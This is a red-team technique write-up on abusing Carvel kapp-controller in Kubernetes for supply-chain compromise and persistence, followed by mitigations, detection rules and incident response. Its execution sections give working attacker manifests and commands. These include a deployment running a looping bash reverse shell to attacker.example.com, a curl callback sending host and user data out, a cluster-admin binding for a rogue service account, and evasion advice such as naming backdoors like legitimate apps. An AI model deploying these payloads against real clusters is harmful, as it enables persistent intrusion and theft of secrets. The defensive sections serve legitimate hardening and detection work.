# [K8S-SUPPLY-003]: Kubernetes Package Manager (KAPP) Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | K8S-SUPPLY-003 |
| **MITRE ATT&CK v18.1** | [T1195.001](https://attack.mitre.org/techniques/T1195/001/) - Supply Chain Compromise: Compromise Software Repository |
| **Tactic** | Initial Access / Persistence / Supply Chain Compromise |
| **Platforms** | Kubernetes |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Carvel kapp-controller 0.40.0+, kapp CLI all versions |
| **Patched In** | N/A - Requires defensive controls and secure configuration practices |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Kubernetes Package Manager (KAPP) Abuse is a supply chain and persistence attack leveraging Carvel's kapp-controller for malicious application deployment and lifecycle management. Kapp-controller is an operator within Kubernetes that enables declarative application management, GitOps-style deployments, and package management through AppCR resources. Attackers exploit insecure kapp configurations, compromised Git repositories referenced by App CRs, or misuse of privileged service accounts to inject malicious applications that persist across cluster updates and operate with cluster-admin or namespace-admin privileges. Unlike Helm, kapp-controller operates continuously within the cluster, making it a persistent backdoor mechanism if compromised.

**Attack Surface:** Carvel kapp-controller instances, Git repositories referenced by App CRs, image repositories referenced in kapp configurations, kapp-controller RBAC permissions, and AppCR specifications that can be modified by cluster users. The attack also leverages kapp's package management features and the ability to define custom deployment ordering and resource dependencies.

**Business Impact:** **Persistent cluster compromise, privilege escalation through controller abuse, supply chain pollution, GitOps pipeline manipulation, automatic malicious application deployment.** Organizations relying on kapp-controller face continuous malicious application deployment, undetectable persistence through GitOps mechanisms, lateral movement through privileged controller service account, and resilience against remediation due to declarative reconciliation loops.

**Technical Context:** Kapp-controller continuously reconciles desired state, meaning deleted malicious applications are automatically redeployed if the App CR remains. Attacks are difficult to detect because they appear as normal declarative configurations. The controller may have elevated privileges granting access to cluster-admin secrets and configuration.

### Operational Risk

- **Execution Risk:** **Medium** - Requires ability to modify App CRs or control referenced Git repositories
- **Stealth:** **High** - Appears as legitimate declarative configuration; reconciliation hides malicious behavior
- **Reversibility:** **No** - Malicious applications are automatically redeployed by controller; requires deletion of App CR and cleanup

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Kubernetes** | 5.1 / 5.2 | RBAC and service account restrictions for operators |
| **CIS Kubernetes** | 4.1 | Restrict access to cluster events and configurations |
| **NIST 800-53** | AC-6 / AC-3 | Least privilege and access control |
| **GDPR** | Art. 32 | Security measures and access control |
| **NIS2** | Art. 21 | Risk management and GitOps integrity |
| **ISO 27001** | A.9.2 / A.9.4 | Access control and privilege management |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Ability to create/modify App CRs in cluster, or write access to Git repositories referenced by App CRs
- **Required Access:** kube-apiserver access with ability to create AppCR resources

**Supported Versions:**
- **Carvel kapp-controller:** 0.40.0+ (all versions)
- **Kubernetes:** 1.16+ (all supported versions)
- **Git:** Any Git service (GitHub, GitLab, Gitea, internal repos)

**Tools:**
- [Carvel kapp-controller](https://carvel.dev/kapp-controller/docs/develop/) (Kubernetes operator)
- [Carvel kapp CLI](https://carvel.dev/kapp/docs/install/) (v0.40.0+)
- [ytt (templating)](https://carvel.dev/ytt/) or [kustomize](https://kustomize.io/)
- [kubectl](https://kubernetes.io/docs/reference/kubectl/) (for CR manipulation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Kapp-Controller Discovery

```bash
# Check if kapp-controller is installed
kubectl get deployment -A | grep kapp-controller
kubectl get ns | grep kapp-controller

# Inspect kapp-controller configuration
kubectl get deployment kapp-controller -n kapp-controller -o yaml

# Check service account permissions
kubectl get rolebinding,clusterrolebinding -A | grep kapp
kubectl get serviceaccount kapp-controller -n kapp-controller -o yaml
```

**What to Look For:**
- kapp-controller running in cluster indicates it can be leveraged for attacks
- Service account permissions show whether controller has cluster-admin access
- ClusterRoleBinding to admin roles indicates high privilege level

### App CR Enumeration

```bash
# List all App CRs in cluster
kubectl get app -A
kubectl describe app -n <namespace>

# Examine App CR specifications
kubectl get app <app-name> -n <namespace> -o yaml

# Check Git repository references
kubectl get app -A -o jsonpath='{.items[*].spec.fetch.git}' | grep -i "url\|repository"

# Check image sources
kubectl get app -A -o jsonpath='{.items[*].spec.template[*].image}'
```

**What to Look For:**
- App CRs with unusual Git repositories (attacker-controlled repos)
- App CRs with missing or disabled authentication to Git
- App CRs with high-privilege service accounts
- App CRs referencing external/untrusted image sources

### Kapp-Controller Permissions Assessment

```bash
# Check kapp-controller RBAC
kubectl get clusterrole kapp-controller -o yaml | grep -i "resources\|verbs"

# Test what kapp-controller can do
kubectl auth can-i get configmaps --as=system:serviceaccount:kapp-controller:kapp-controller --all-namespaces

# List all resources controller has access to
kubectl get clusterrolebindings -o yaml | grep -A5 "kapp-controller"
```

**What to Look For:**
- Wildcard permissions (`*`) or admin roles assigned to controller
- Ability to read secrets, configmaps across namespaces
- Ability to create deployments, daemonsets, statefulsets

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Malicious App CR Injection

**Supported Versions:** kapp-controller 0.40.0+, Kubernetes 1.16+

#### Step 1: Create Malicious Git Repository

**Objective:** Set up Git repository containing malicious application manifests

**Command (Repository Setup):**

```bash
# Create private Git repository with malicious application
mkdir malicious-app-repo
cd malicious-app-repo
git init

# Create malicious kapp configuration
cat > kapp-config.yaml << 'EOF'
apiVersion: kapp.k14s.io/v1alpha1
kind: Config
minimumKappVersion: "0.40.0"

# Ensure deployments order (backdoor deploys first)
templates:
- paths:
  - "manifests/"
  resourceMatchers:
  - kindRegexps:
    - Deployment
    apiVersionRegexps:
    - apps/v1
  
# Enable override to allow privilege escalation
rebaseRules: []
EOF

# Create backdoored deployment
cat > manifests/deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: malicious-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backdoor
  template:
    metadata:
      labels:
        app: backdoor
    spec:
      serviceAccountName: malicious-sa
      containers:
      - name: backdoor
        image: attacker-registry.com/backdoor:latest
        imagePullPolicy: Always
        command:
        - sh
        - -c
        - |
          # Reverse shell to attacker C2
          while true; do
            bash -i >& /dev/tcp/attacker.example.com/4444 0>&1 || true
            sleep 60
          done
        env:
        - name: KUBECONFIG
          value: /var/run/secrets/kubernetes.io/serviceaccount/config
        volumeMounts:
        - name: sa-token
          mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      volumes:
      - name: sa-token
        projected:
          sources:
          - serviceAccountToken:
              path: token
              expirationSeconds: 3600
EOF

# Create privileged service account
cat > manifests/serviceaccount.yaml << 'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: malicious-sa
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: malicious-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: malicious-sa
  namespace: default
EOF

# Commit to repository
git add .
git commit -m "Initial application setup"
```

**Expected Output:**

```
[main (root-commit) abc1234] Initial application setup
 3 files changed, 50 insertions(+)
```

**What This Means:**
- Git repository now contains malicious application manifests
- Kapp-controller can reference and deploy from this repository

**OpSec & Evasion:**
- Use private Git repository with restricted access
- Embed backdoor in legitimate-looking deployment configuration
- Detection likelihood: **Medium** if Git repository is monitored; **Low** if private

#### Step 2: Create Malicious App CR

**Objective:** Deploy malicious application through kapp-controller via App CR

**Command (App CR Creation):**

```bash
# Create App CR referencing malicious Git repository
kubectl apply -f - << 'EOF'
apiVersion: packaging.carvel.dev/v1alpha1
kind: App
metadata:
  name: malicious-app
  namespace: default
spec:
  # Reference malicious Git repository
  fetch:
  - git:
      url: https://attacker.example.com/malicious-app-repo.git
      ref: main
      secretRef:
        name: git-creds  # Or omit if public
  # Template manifests (optional - can use raw YAML)
  template:
  - ytt:
      inline:
        pathsFrom:
        - secretRef:
            name: app-values
  # Deploy manifests
  deploy:
  - kapp:
      rawOptions:
      - --diff-changes=true
      - --apply-ignored=true
EOF
```

**Expected Output:**

```
app.packaging.carvel.dev/malicious-app created
```

**What This Means:**
- App CR is now registered in cluster
- kapp-controller continuously reconciles and deploys malicious application
- Application deployment is automatic and persistent

**OpSec & Evasion:**
- Name the App CR similarly to legitimate applications (e.g., "monitoring-app", "logging-app")
- Use namespace obscurity (default namespace vs custom namespace)
- Set imagePullPolicy to Always to force re-pull and bypass caching
- Detection likelihood: **Medium** if App CRs are monitored; **Low** if manual review

#### Step 3: Maintain Persistence

**Objective:** Ensure malicious application survives cluster restarts and remediation attempts

**Command (Persistence Configuration):**

```bash
# Update App CR to re-deploy if deleted
cat > persistent-app.yaml << 'EOF'
apiVersion: packaging.carvel.dev/v1alpha1
kind: App
metadata:
  name: malicious-app
  namespace: default
  finalizers:
  - apps.carvel.dev/finalizer  # Prevents accidental deletion
spec:
  serviceAccountName: kapp-sa  # Use elevated service account
  fetch:
  - git:
      url: https://attacker.example.com/malicious-app-repo.git
      ref: main
  # Aggressive reconciliation
  syncPeriod: 1m  # Sync every minute
  template:
  - kapp: {}
  deploy:
  - kapp:
      rawOptions:
      - --wait=true
      - --wait-ui=true
      - --wait-check-interval=5s
EOF

kubectl apply -f persistent-app.yaml
```

**Expected Output:**

```
app.packaging.carvel.dev/malicious-app configured
```

**What This Means:**
- Application automatically redeploys if removed
- Cluster reconciliation ensures persistence even after reboot
- Attacker maintains control indefinitely

### METHOD 2: Git Repository Compromise

**Supported Versions:** kapp-controller 0.40.0+, Kubernetes 1.16+

#### Step 1: Compromise Existing Git Repository

**Objective:** Gain write access to legitimate Git repository referenced by App CR

**Command (Repository Access):**

```bash
# Attacker obtains Git credentials through:
# 1. Leaked credentials in GitHub Actions secrets
# 2. Compromised developer machine
# 3. Weak repository access control

# Verify access to repository
git clone https://git-creds:token@github.com/victim-org/app-repo.git
cd app-repo
git log --oneline -5
```

**Expected Output:**

```
abc1234 Latest application version
def5678 Security update
ghi9012 Dependency upgrade
```

**What This Means:**
- Attacker has write access to repository
- Can inject malicious changes into application manifests

#### Step 2: Inject Malicious Payload

**Objective:** Add malicious deployment to legitimate application repository

**Command (Payload Injection):**

```bash
# Add backdoored deployment to legitimate repository
cat >> manifests/backdoor.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: monitor
  template:
    metadata:
      labels:
        app: monitor
    spec:
      containers:
      - name: monitor
        image: attacker.example.com/monitor:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          while true; do
            curl -X POST http://attacker.example.com/callback \
              -d "hostname=$(hostname)" \
              -d "user=$(whoami)"
            sleep 300
          done
EOF

# Commit malicious change
git add manifests/backdoor.yaml
git commit -m "Add system monitoring for observability"
git push origin main
```

**Expected Output:**

```
Enumerating objects: 3, done.
Writing objects: 100% (3/3), 250 bytes | 250.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0)
```

**What This Means:**
- Malicious change is now in repository
- kapp-controller automatically detects and applies changes
- Backdoor deploys to cluster on next reconciliation cycle

#### Step 3: Trigger Reconciliation

**Objective:** Force kapp-controller to pull and deploy updated manifests

**Command (Trigger Update):**

```bash
# Force immediate reconciliation
kubectl patch app malicious-app --type merge -p '{"spec":{"paused":false}}'

# Or wait for automatic reconciliation (default: every minute)
# Monitor reconciliation status
kubectl get app malicious-app -w
kubectl describe app malicious-app | grep -A10 "Status"
```

**Expected Output:**

```
NAME            STATUS              Age
malicious-app   Reconciling         5s
malicious-app   ReconcileSucceeded  10s
```

**What This Means:**
- Kapp-controller has pulled latest changes from Git
- Malicious application is now deployed in cluster
- Persistence is maintained through Git repository

### METHOD 3: Service Account Privilege Escalation

**Supported Versions:** kapp-controller 0.40.0+, Kubernetes 1.16+

#### Step 1: Identify Controller Permissions

**Objective:** Determine kapp-controller privileges

**Command:**

```bash
# Check kapp-controller role permissions
kubectl get clusterrole kapp-controller -o yaml

# Test what we can do as kapp-controller
kubectl auth can-i create deployments --as=system:serviceaccount:kapp-controller:kapp-controller --all-namespaces
kubectl auth can-i get secrets --as=system:serviceaccount:kapp-controller:kapp-controller --all-namespaces
```

**Expected Output:**

```
yes (controller can create deployments)
yes (controller can access secrets)
```

#### Step 2: Exploit Controller Permissions

**Objective:** Use kapp-controller's elevated privileges to escalate attack

**Command (Privilege Escalation):**

```bash
# Create App CR that uses controller's service account
cat > privilege-escalation.yaml << 'EOF'
apiVersion: packaging.carvel.dev/v1alpha1
kind: App
metadata:
  name: secret-stealer
spec:
  serviceAccountName: kapp-controller  # Use controller's SA
  fetch:
  - git:
      url: https://attacker.example.com/secret-stealer.git
  deploy:
  - kapp:
      rawOptions:
      - --apply-ignored=true
EOF

kubectl apply -f privilege-escalation.yaml
```

**What This Means:**
- Malicious application runs with kapp-controller's service account
- Can access all secrets, configmaps the controller can access
- Can escalate to cluster-admin if controller has those permissions

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Restrict App CR Creation/Modification:** Limit who can create and modify App CRs.

    **Manual Steps:**
    1. Create role with restricted App CR permissions:
       ```yaml
       apiVersion: rbac.authorization.k8s.io/v1
       kind: Role
       metadata:
         name: app-deployer
         namespace: default
       rules:
       - apiGroups: ["packaging.carvel.dev"]
         resources: ["apps"]
         verbs: ["create", "patch", "update"]
         # But restrict to specific apps
         resourceNames:
         - "approved-app-1"
         - "approved-app-2"
       ```
    2. Create RoleBinding for specific users/groups:
       ```yaml
       apiVersion: rbac.authorization.k8s.io/v1
       kind: RoleBinding
       metadata:
         name: app-deployer-binding
         namespace: default
       roleRef:
         apiGroup: rbac.authorization.k8s.io
         kind: Role
         name: app-deployer
       subjects:
       - kind: Group
         name: "platform-team"
       ```

*   **Enforce Git Repository Verification:** Require signed commits and approved repositories.

    **Manual Steps:**
    1. Enable branch protection in Git repository:
       - GitHub: Settings → Branches → Branch protection rules
       - Require code reviews, signed commits
    2. Create Kyverno policy to restrict Git sources:
       ```yaml
       apiVersion: kyverno.io/v1
       kind: ClusterPolicy
       metadata:
         name: restrict-git-repos
       spec:
         validationFailureAction: enforce
         rules:
         - name: approved-git-repos
           match:
             resources:
               kinds:
               - App
               apiVersions:
               - packaging.carvel.dev/v1alpha1
           validate:
             message: "Only approved Git repositories allowed"
             pattern:
               spec:
                 fetch:
                 - git:
                     url: "https://github.com/approved-org/*"
       ```

*   **Restrict Kapp-Controller Service Account Permissions:** Remove unnecessary privileges from controller.

    **Manual Steps:**
    1. Create minimal role for kapp-controller:
       ```yaml
       apiVersion: rbac.authorization.k8s.io/v1
       kind: ClusterRole
       metadata:
         name: kapp-controller-minimal
       rules:
       - apiGroups: ["apps"]
         resources: ["deployments", "daemonsets", "statefulsets"]
         verbs: ["get", "list", "watch", "create", "patch"]
       - apiGroups: [""]
         resources: ["services", "configmaps"]
         verbs: ["get", "list", "watch", "create", "patch"]
       # Explicitly deny cluster-admin access
       ---
       apiVersion: rbac.authorization.k8s.io/v1
       kind: ClusterRoleBinding
       metadata:
         name: deny-kapp-admin
       roleRef:
         apiGroup: rbac.authorization.k8s.io
         kind: ClusterRole
         name: kapp-controller-minimal
       subjects:
       - kind: ServiceAccount
         name: kapp-controller
         namespace: kapp-controller
       ```

### Priority 2: HIGH

*   **Monitor App CR Changes:** Audit and alert on App CR modifications.

    **Manual Steps:**
    1. Enable Kubernetes audit logging for App CRs:
       ```yaml
       - level: RequestResponse
         verbs: ["create", "patch", "update", "delete"]
         resources: ["apps"]
         apiVersions: ["packaging.carvel.dev/v1alpha1"]
       ```
    2. Create monitoring alerts:
       ```bash
       # Monitor for unexpected App CR changes
       kubectl get app -A -w
       # Alert if App CR references unapproved Git repo
       ```

*   **Validate Git Repository Content:** Scan Git repositories for malicious content before deployment.

    **Manual Steps:**
    1. Implement pre-commit hooks in Git:
       ```bash
       # .git/hooks/pre-commit
       #!/bin/bash
       # Scan manifests for suspicious patterns
       grep -r "imagePullPolicy: Never" . && exit 1
       grep -r "serviceAccountName: kapp-controller" . && exit 1
       ```
    2. Add GitHub/GitLab checks:
       - Require branch protection
       - Require code reviews
       - Require CI/CD checks

### Access Control & Policy Hardening

*   **Pod Security Standards:** Prevent privileged container deployment via kapp.

    **Manual Steps:**
    1. Apply Pod Security Standards to kapp-controller namespace:
       ```bash
       kubectl label namespace kapp-controller \
         pod-security.kubernetes.io/enforce=restricted \
         pod-security.kubernetes.io/audit=restricted
       ```

*   **Network Policies:** Restrict kapp-controller outbound connections.

    **Manual Steps:**
    1. Create NetworkPolicy limiting controller egress:
       ```yaml
       apiVersion: networking.k8s.io/v1
       kind: NetworkPolicy
       metadata:
         name: kapp-controller-egress
         namespace: kapp-controller
       spec:
         podSelector:
           matchLabels:
             app: kapp-controller
         policyTypes:
         - Egress
         egress:
         - to:
           - podSelector: {}  # Allow within cluster
         - to:
           - namespaceSelector: {}
           ports:
           - protocol: TCP
             port: 443  # Only HTTPS for Git
           - protocol: TCP
             port: 53   # DNS
       ```

#### Validation Command (Verify Fix)

```bash
# Verify RBAC restrictions
kubectl get rolebindings,clusterrolebindings -A | grep kapp

# Verify Git repository restrictions via Kyverno
kubectl get clusterpolicy | grep restrict-git

# Verify network policies
kubectl get networkpolicies -n kapp-controller

# Check App CR RBAC
kubectl auth can-i create app --as=default-user
```

**Expected Output (If Secure):**

```
NAME                        ROLE                            AGE
kapp-controller-minimal     kapp-controller-minimal         5m

NAME                                   VALIDATIONACTION   AGE
restrict-git-repos                     enforce            5m

NAME                          POD SELECTOR   AGE
kapp-controller-egress        app=...        5m

no  # User cannot create App CRs
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **App CR Indicators:**
    - App CR referencing Git repository not in organizational allowlist
    - App CR with syncPeriod set to aggressive value (< 1m)
    - App CR with finalizers preventing deletion
    - App CR referencing unapproved image registries
    - App CR with malicious Git URLs (typosquatting, attacker domains)

*   **Git Repository Indicators:**
    - Unexpected commits in Git repository (check commit history)
    - Manifests containing unusual container commands/args
    - Manifests deploying to kube-system or other sensitive namespaces
    - Manifest references to attacker-controlled image registries
    - Uncommitted/untracked manifests in Git repository

*   **Deployment Indicators:**
    - Unexpected deployments created by kapp-controller
    - Deployments with unusual service account references
    - Deployments with imagePullPolicy: Always pointing to external registry
    - Deployments with reverse shell commands or C2 communications

*   **Permission Indicators:**
    - Kapp-controller service account with cluster-admin role
    - Excessive RBAC permissions for controller
    - Users with unexpected App CR modification permissions

### Forensic Artifacts

*   **App CR Specifications:** Check current and historical App CRs
    ```bash
    kubectl get app -A -o yaml > apps-backup.yaml
    kubectl describe app <app-name> -n <namespace>
    ```

*   **Git Repository History:** Inspect commit history for malicious changes
    ```bash
    cd /path/to/repo
    git log --oneline -20
    git show <commit-hash>  # Inspect specific commit
    ```

*   **Kubernetes Audit Logs:** Check for App CR creation/modification events
    ```bash
    # Query audit logs for App CR events
    grep -i "app" /var/log/kube-apiserver-audit.log | grep -i "create\|patch"
    ```

*   **Kapp-Controller Logs:** Check controller reconciliation status
    ```bash
    kubectl logs -n kapp-controller deployment/kapp-controller -f
    ```

### Response Procedures

1.  **Isolate:**
    **Command:**
    ```bash
    # Immediately delete malicious App CR
    kubectl delete app <malicious-app> -n <namespace> --grace-period=0

    # Force remove finalizers if stuck
    kubectl patch app <malicious-app> -n <namespace> -p '{"metadata":{"finalizers":[]}}' --type=merge

    # Delete resulting deployments
    kubectl delete deployment <malicious-deployment> -n <namespace> --grace-period=0 --force
    
    # Revoke compromised Git credentials
    # GitHub/GitLab: Delete personal access tokens, rotate deploy keys
    ```

2.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export App CR specification
    kubectl get app <app-name> -n <namespace> -o yaml > app-cr.yaml
    
    # Export kapp-controller logs
    kubectl logs -n kapp-controller deployment/kapp-controller --tail=1000 > kapp-logs.txt
    
    # Export Git commit history
    git log --oneline -50 > git-history.txt
    git diff HEAD~10 HEAD > git-changes.patch
    
    # Export affected Kubernetes resources
    kubectl get all -n <namespace> -o yaml > namespace-resources.yaml
    ```

3.  **Remediate:**
    **Command:**
    ```bash
    # Reset Git repository to known good state
    cd /path/to/repo
    git reset --hard origin/main~5  # Reset to 5 commits ago
    git push -f origin main
    
    # Restart kapp-controller to reload configuration
    kubectl rollout restart deployment/kapp-controller -n kapp-controller
    
    # Force reconciliation after cleanup
    kubectl patch app <legitimate-app> -n <namespace> -p '{"spec":{"paused":false}}'
    
    # Audit RBAC to remove unauthorized permissions
    kubectl delete rolebinding <malicious-binding>
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [K8S-SUPPLY-001] / [K8S-SUPPLY-002] | Helm or Container Image Poisoning |
| **2** | **Persistence** | **[K8S-SUPPLY-003]** | **Malicious App CR via kapp-controller** |
| **3** | **Privilege Escalation** | Service Account Abuse | Use controller's elevated SA permissions |
| **4** | **Lateral Movement** | Cluster API Access | Access to secrets across namespaces |
| **5** | **Impact** | Data Exfiltration / Cluster Takeover | Complete infrastructure compromise |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Carvel Security Disclosure (2024)

- **Target:** Organizations using Carvel kapp-controller with loose RBAC
- **Timeline:** General vulnerability class (not specific CVE, but architectural risk)
- **Technique Status:** ACTIVE - Insecure kapp-controller configurations remain prevalent
- **Impact:** Cluster compromise through GitOps pipeline manipulation
- **Reference:** [Carvel Security Guidelines](https://carvel.dev/kapp-controller/docs/develop/security/)

### Example 2: Poisoned Pipeline Execution (PPE) in CI/CD

- **Target:** Organizations using GitHub Actions, GitLab CI, or similar with kapp deployments
- **Timeline:** Documented vulnerability pattern 2023-2024
- **Technique Status:** ACTIVE - PPE attacks continue against CI/CD pipelines
- **Impact:** Malicious changes to deployment configurations deployed automatically
- **Reference:** [GHSL PPE Advisories](https://securitylab.github.com/advisories/), [Harness Blog on PPE](https://www.harness.io/blog/ci-protecting-against-ppe)

### Example 3: GitOps Supply Chain Attack (Cilium)

- **Target:** Cilium Helm chart repository and CI/CD pipeline
- **Timeline:** GHSL-2024-226/227, disclosed 2024
- **Technique Status:** ACTIVE - Poisoned Pipeline Execution on chart repository
- **Impact:** Potential credential exfiltration, cache poisoning, privilege escalation
- **Reference:** [GitHub Security Lab - Cilium PPE Vulnerability](https://securitylab.github.com/advisories/)

---